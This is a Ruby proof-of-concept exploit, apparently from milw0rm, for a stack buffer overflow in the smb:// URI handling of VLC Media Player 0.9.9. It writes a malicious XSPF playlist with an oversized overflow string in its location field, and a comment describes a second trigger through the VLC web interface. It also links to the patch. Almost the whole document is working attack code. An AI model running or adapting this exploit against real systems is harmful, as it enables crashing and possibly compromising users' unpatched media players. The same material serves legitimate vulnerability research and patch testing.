#!/usr/bin/ruby

# VideoLAN VLC Media Player 0.9.9 smb:// URI Stack-based Buffer Overflow (Proof-of-Concept)
#
# Bugtraq ID: 35500
#
# The vulnerability can also be triggered via the VLC web interface (disabled by default):
# http://[vulnerable_ip]:8080/requests/status.xml?command=in_play&input=smb://............
#
# Patch:
# http://git.videolan.org/?p=vlc.git;a=commitdiff;h=e60a9038b13b5eb805a76755efc5c6d5e080180f
#
# Tested on Windows XP SP3 (fully patched), VLC player version 0.9.9 (latest).
#
# Trancer
# http://www.rec-sec.com

foo = "A" * 58
bar = "B" * 4
baz = "C" * 1000

b00m = foo + bar + baz

xspf = %Q|<?xml version="1.0" encoding="UTF-8"?>
<playlist version="1" xmlns="http://xspf.org/ns/0/" xmlns:vlc="http://www.videolan.org/vlc/playlist/ns/0/">
	<title>Playlist</title>
	<trackList>
		<track>
			<location>smb://foo.com@www.foo.com/foo/#{b00m}</location>
			<extension application="http://www.videolan.org/vlc/playlist/0">
				<vlc:id>0</vlc:id>
			</extension>
		</track>
	</trackList>
</playlist>
|

playlist = File.new("vlc_smb.xspf","wb")
playlist.write(xspf)
playlist.close

# milw0rm.com [2009-06-29]